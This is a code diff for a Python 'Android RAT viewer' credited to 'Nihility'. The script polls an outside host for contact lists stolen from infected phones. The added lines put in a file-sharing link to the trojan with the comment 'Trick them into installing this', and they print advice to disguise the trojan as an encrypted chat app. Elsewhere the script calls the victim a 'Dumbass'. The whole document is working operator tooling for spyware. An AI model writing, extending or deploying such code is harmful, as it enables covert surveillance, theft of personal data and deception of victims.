@@ -5,6 +5,8 @@ RED = "\033[31m"
 GREEN = "\033[32m"
 BLUE = "\033[34m"
 RESET = "\033[0m"
+version = "v0.1"
+ar_link = "https://limewire.com/d/qH3xr#XMBJdH6JNP (Trick them into installing this.)"
 contacts_url = "http://bluntcord.medianewsonline.com/aroid_to/contacts.txt"
 print(f"{BLUE}Coded by Nihility{RESET}")
 print(f"{RED}Android RAT viewer.{RESET}")
@@ -35,14 +37,16 @@ while True:
 
  CODE: Nihility
 I might need a coffee break, it's 3:18 AM
-  
+NAME: Android Rat (Texter 2026)
 
                       """)
+                print("The Trojans url: " + ar_link + "\n Best way is to make them think it's a encrypted chatting application.")
                 print(f"{RED}Dumbass has yet to open the trojan, waiting...{RESET}")
                 
         else:
             print(f"Received status code {response.status_code}")
     except Exception as e:
-        print(f"Error fetching contacts.txt: {e}")
+        print(f"Error fetching data, Content might be too large to gather. Download it.: {e}") # Remember to implent a download function
+        os.system('clear')
 
     time.sleep(2)
